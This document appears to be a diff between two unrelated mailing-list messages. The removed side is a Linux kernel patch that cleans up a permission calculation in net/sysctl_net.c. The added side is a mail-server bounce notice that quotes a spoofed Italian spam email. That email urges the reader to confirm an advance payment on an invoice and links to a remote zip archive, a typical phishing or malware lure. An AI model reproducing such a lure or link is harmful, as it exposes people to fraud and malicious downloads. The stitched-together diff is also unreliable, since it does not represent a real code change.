@@ -1,7 +1,7 @@
-From: Zhao Hongjiang <zhaohongjiang37-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
-Subject: [PATCH] user_ns: get rid of duplicate code in net_ctl_permissions
-Date: Tue, 30 Oct 2012 19:18:40 +0800
-Message-ID: <508FB790.7080901@gmail.com>
+From: MAILER-DAEMON-5ocCzMPXNzN3f2k8nOAnc6r1yxrz7p3u@public.gmane.org
+Subject: failure notice
+Date: 30 Oct 2012 13:47:08 +0100
+Message-ID: <20121030125356.3AFF182A@mail.linuxfoundation.org>
 Mime-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
@@ -15,34 +15,50 @@ List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
 Sender: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: "Eric W. Biederman" <ebiederm-aS9lmoZGLiVWk0Htik3J/w@public.gmane.org>
-Cc: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-From: Zhao Hongjiang <zhaohongjiang-hv44wF8Li93QT0dZR+AlfA@public.gmane.org>
+Hi. This is the qmail-send program at mail.sipalinformatica.it.
+I'm afraid I wasn't able to deliver your message to the following addresses.
+This is a permanent error; I've given up. Sorry it didn't work out.
 
-Get rid of duplicate code in net_ctl_permissions and fix the comment.
+<na.gandolfo-eupC8VMmzveMVPazPUTyfzUZDU+1vuVT@public.gmane.org>:
+Sorry, no mailbox here by that name. (#5.1.1)
 
-Signed-off-by: Zhao Hongjiang <zhaohongjiang-hv44wF8Li93QT0dZR+AlfA@public.gmane.org>
----
- net/sysctl_net.c |    4 ++--
- 1 files changed, 2 insertions(+), 2 deletions(-)
+--- Below this line is a copy of the message.
 
-diff --git a/net/sysctl_net.c b/net/sysctl_net.c
-index 6410436..9bc6db0 100644
---- a/net/sysctl_net.c
-+++ b/net/sysctl_net.c
-@@ -51,10 +51,10 @@ static int net_ctl_permissions(struct ctl_table_header *head,
- 		int mode = (table->mode >> 6) & 7;
- 		return (mode << 6) | (mode << 3) | mode;
- 	}
--	/* Allow netns root group to have the same assess as the root group */
-+	/* Allow netns root group to have the same access as the root group */
- 	if (gid_eq(root_gid, current_gid())) {
- 		int mode = (table->mode >> 3) & 7;
--		return (mode << 3) | (mode << 3) | mode;
-+		return (mode << 3) | mode;
- 	}
- 	return table->mode;
- }
--- 1.7.1
+Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: (qmail 25880 invoked by uid 1010); 30 Oct 2012 13:47:08 +0100
+Received: from 188.40.89.3 by mail (envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>, uid 1008) with qmail-scanner-1.25-st-qms 
+ (clamdscan: 0.92.1/5777. spamassassin: 3.2.4. perlscan: 1.25-st-qms.  
+ Clear:RC:1(188.40.89.3):SA:0(0.0/5.0):. 
+ Processed in 0.52956 secs); 30 Oct 2012 12:47:08 -0000
+X-Spam-Status: No, hits=0.0 required=5.0
+X-Antivirus-SIPALINFORMATICA-Mail-From: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org via mail
+X-Antivirus-SIPALINFORMATICA: 1.25-st-qms (Clear:RC:1(188.40.89.3):SA:0(0.0/5.0):. Processed in 0.52956 secs Process 25870)
+Received: from static.3.89.40.188.clients.your-server.de (HELO Debian-50-lenny-32-minimal) (188.40.89.3)
+  by mail.sipalinformatica.it with SMTP; 30 Oct 2012 13:47:07 +0100
+Received: from root by Debian-50-lenny-32-minimal with local-bsmtp (Exim 4.71 (FreeBSD))
+	(envelope-from <forum-UI8Ajb8Xo98kZRhte9MuKA@public.gmane.org>)
+	id 4g6wC3-000q9s-HG; Tue, 30 Oct 2012 08:47:06 -0400
+Date: Tue, 30 Oct 2012 08:47:06 -0400
+From: "confirming" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <na.gandolfo-eupC8VMmzveMVPazPUTyfzUZDU+1vuVT@public.gmane.org>
+Subject: Re: Rimesse
+Message-ID: <ksEy7337958@Debian-50-lenny-32-minimal>
+MIME-Version: 1.0
+Content-Type: text/plain;
+ charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+
+
+
+       
+Buongiorno, 
+
+Si prega di confermare il 20% tt pagamento anticipato.
+nei confronti della fattura proforma PO25845/2012
+http://macofer.com.ar/Invio.zip
+Aspetto la tua risposta
+
+Cordiali saluti
